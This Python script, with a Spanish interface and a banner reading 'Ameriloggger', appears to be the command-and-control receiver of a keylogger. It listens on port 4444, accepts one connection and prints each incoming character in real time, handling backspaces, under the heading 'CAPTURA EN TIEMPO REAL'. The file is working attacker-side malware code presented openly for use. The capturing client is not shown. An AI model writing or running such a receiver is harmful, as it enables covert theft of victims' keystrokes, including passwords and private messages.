import socket
import time
import threading
import sys

print("""
    ___                        _ __                       
   /   |  ____ ___  ___  _____(_) /___  ____ _____ ____  _____
  / /| | / __ `__ \/ _ \/ ___/ / / __ \/ __ `/ __ `/ _ \/ ___/
 / ___ |/ / / / / /  __/ /  / / / /_/ / /_/ / /_/ /  __/ /    
/_/  |_/_/ /_/ /_/\___/_/  /_/_/\____/\__, /\__, /\___/_/     
                                     /____//____/              
""")

esperando = True

def parpadeo():
    puntos = 0
    while esperando:
        texto = 'Escuchando' + '.' * puntos
        espacios = ' ' * ((60 - len(texto)) // 2)
        sys.stdout.write('\r' + ' ' * 70)  
        sys.stdout.write('\r' + espacios + texto)
        sys.stdout.flush()
        puntos = (puntos + 1) % 4
        time.sleep(0.5)

thread_parpadeo = threading.Thread(target=parpadeo, daemon=True)
thread_parpadeo.start()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4444))
s.listen(1)

conn, addr = s.accept()

esperando = False
time.sleep(0.6)
sys.stdout.write('\r' + ' ' * 70 + '\r')
sys.stdout.flush()

print(f"\n[+] CONEXION ESTABLECIDA")
print(f"    {addr[0]}:{addr[1]}\n")
print("CAPTURA EN TIEMPO REAL:\n")

while True:
    try:
        data = conn.recv(1)
        if not data:
            print("\n\n[!] Conexion cerrada")
            break

        try:
            caracter = data.decode('utf-8')
            
            if caracter == '\b':
                sys.stdout.write('\b \b') 
                sys.stdout.flush()
            else:
                sys.stdout.write(caracter)
                sys.stdout.flush()
        except:
            pass

    except KeyboardInterrupt:
        print("\n\n[!] Listener detenido manualmente")
        break
    except Exception as e:
        print(f"\n\n[!] Error en conexion: {e}")
        break

conn.close()
s.close()